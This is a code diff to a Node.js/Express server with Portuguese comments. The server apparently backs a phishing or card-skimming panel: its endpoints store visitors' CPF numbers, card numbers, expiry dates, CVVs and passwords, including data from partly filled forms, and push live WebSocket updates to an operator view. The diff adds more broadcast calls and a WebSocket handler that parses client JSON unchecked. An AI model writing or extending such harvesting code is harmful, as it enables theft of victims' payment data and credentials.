@@ -352,7 +352,7 @@ app.post('/api/temp-submit', validateToken, async (req, res) => {
             [sessionId, decryptedCpf || null, encryptedCardNumber || null, decryptedExpiryDate || null, encryptedCvv || null, encryptedPassword || null]
         );
         console.log('Query executada com sucesso:', result.rowCount);
-        broadcast({ type: 'TEMP_DATA_UPDATE' });
+        broadcast({ type: 'TEMP_DATA_UPDATE' }); // Envia broadcast após inserção/atualização
         res.json({ message: 'Dados temporários salvos com sucesso!' });
     } catch (error) {
         console.error('Erro em /api/temp-submit:', error.message, 'Stack:', error.stack);
@@ -396,7 +396,7 @@ app.get('/api/temp-data', async (req, res) => {
 app.delete('/api/delete-temp-data/:sessionId', async (req, res) => {
     try {
         await pool.query('DELETE FROM temp_data WHERE session_id = $1', [req.params.sessionId]);
-        broadcast({ type: 'TEMP_DATA_UPDATE' });
+        broadcast({ type: 'TEMP_DATA_UPDATE' }); // Envia broadcast após exclusão
         res.json({ message: 'Dados temporários removidos com sucesso!' });
     } catch (error) {
         res.status(500).json({ error: 'Erro interno do servidor.' });
@@ -428,6 +428,7 @@ app.post('/submit', validateToken, async (req, res) => {
             await pool.query('DELETE FROM temp_data WHERE session_id = $1', [sessionId]);
         }
         broadcast({ type: 'FORM_DATA_UPDATE' });
+        broadcast({ type: 'TEMP_DATA_UPDATE' }); // Envia broadcast após submissão
         res.json({ message: 'Dados enviados com sucesso!' });
     } catch (error) {
         console.error('Erro em /submit:', error.message, 'Stack:', error.stack);
@@ -537,6 +538,12 @@ async function startServer() {
             console.log('Novo cliente WebSocket conectado');
             ws.on('close', () => console.log('Cliente WebSocket desconectado'));
             ws.on('error', (error) => console.error('Erro WebSocket:', error.message));
+            ws.on('message', (message) => {
+                const data = JSON.parse(message);
+                if (data.type === 'INITIAL_UPDATE') {
+                    broadcast({ type: 'TEMP_DATA_UPDATE' }); // Envia atualização inicial
+                }
+            });
             broadcast({ type: 'VISIT_UPDATE' });
             broadcast({ type: 'FORM_DATA_UPDATE' });
             broadcast({ type: 'TEMP_DATA_UPDATE' });
